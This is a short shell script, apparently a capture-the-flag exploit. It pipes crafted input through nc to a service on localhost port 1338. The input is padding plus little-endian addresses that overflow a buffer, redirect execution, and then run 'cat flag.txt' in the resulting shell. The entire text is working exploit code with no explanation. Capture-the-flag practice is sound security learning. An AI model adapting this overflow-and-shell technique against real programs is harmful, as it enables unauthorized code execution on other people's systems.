(
  sleep 1
  echo -ne $(head -c 76 </dev/zero | tr '\0' 'a')
  echo -e $'\x60\x00\x00\x00'
  sleep 1
  echo 69
  sleep 1
  echo -ne $(head -c 88 </dev/zero | tr '\0' 'a')
  echo -e '\x65\x2F\x40\x00\x00\x00\x00\x00'
  sleep 1
  echo 'cat flag.txt'
  sleep 1
) | nc 127.0.0.1 1338
